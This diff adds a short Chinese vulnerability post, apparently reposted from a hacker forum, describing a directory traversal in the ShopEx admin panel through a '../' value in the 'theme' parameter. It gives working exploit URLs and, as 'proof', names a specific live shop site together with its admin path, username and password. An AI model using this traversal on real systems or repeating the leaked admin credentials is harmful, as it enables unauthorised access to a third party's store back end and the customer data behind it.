@@ -1,0 +1,22 @@
+ShopEx后台历遍目录 很蛋疼的
+ 记得10年的是也有过的差不多的漏洞
+ 
+详细说明：
+ 
+主要是出在模板上
+ 我们编辑目录之后得到URL
+ http://hake.cc /shopadmin/index.php#ctl=system/tmpimage&act=index&theme=
+ 这里theme= 可以做../跳转
+ http://hake.cc /shopadmin/index.php#ctl=system/tmpimage&act=index&theme=../
+ 跳到了上级目录
+  
+ 
+漏洞证明：
+ 
+给个实例证明
+ http://mocosn.com/
+ 后台:shopadmin
+ 用户:mocosnnet
+ 密码:kingsvm-
+
+文章来自：哈客部落详文参考：http://www.hake.cc/Web_loudong/2012/0907/83168.html
